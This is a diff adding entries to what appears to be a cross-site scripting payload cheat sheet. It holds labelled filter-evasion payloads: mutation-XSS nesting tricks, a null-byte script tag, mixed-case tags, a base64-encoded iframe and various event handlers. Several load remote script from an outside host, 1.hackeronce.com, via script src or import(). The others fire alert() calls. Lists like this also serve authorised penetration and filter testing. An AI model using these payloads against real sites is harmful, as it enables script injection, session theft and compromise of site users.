@@ -34,3 +34,39 @@ Create Element
 javascript:eval('var a=document.createElement(\'script\');a.src=\'//1.hackeronce.com\';document.body.appendChild(a)')
 Plain JS
 document.head.appendChild(Object.assign(document.createElement('script'),{src:'//1.hackeronce.com'}));
+
+SVG Style alternate payload
+"><svg><style><a alt="</style><img src=x onerror=alert('//1.hackeronce.com/a')>">
+NoScript Style payload
+<noscript><style></noscript><img src=x onerror="alert('//1.hackeronce.com/b')">
+Form Math Mglyph Style payload
+<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert('//1.hackeronce.com/c')>
+SVG Style alternate payload 2
+<svg><style><a alt="</style><img src=x onerror=alert('//1.hackeronce.com/d')>">
+
+Null Byte Script
+<scr%00ipt src=//1.hackeronce.com></script>
+Tab Onload
+<svg/onload%09=alert('//1.hackeronce.com')>
+IMG Onerror Unclosed
+<img src=x onerror="alert('//1.hackeronce.com')"
+OnMouseOver
+x" onmouseover="alert('//1.hackeronce.com')
+Junk Import
+';import('//1.hackeronce.com');//
+
+Details Toggle Import
+&#x3C;details open ontoggle=import('//1.hackeronce.com')&#x3E;
+Case Insensitive Script
+<sCrIpT src=//1.hackeronce.com></sCrIpT>
+Iframe Base64
+<iframe src="data:text/html;base64,PHNjcmlwdCBzcmM9Ly8xLmhhY2tlcm9uY2UuY29tPjwvc2NyaXB0Pg=="></iframe>
+
+#Less Common Event Handlers
+
+Input AutoFocus
+"><input autofocus onfocus=alert('//1.hackeronce.com')>
+Details Toggle Alert
+"><details open ontoggle=alert('//1.hackeronce.com')>
+Paragraph OnPointerEnter
+"><p onpointerenter=alert('//1.hackeronce.com')>Please read this</p>
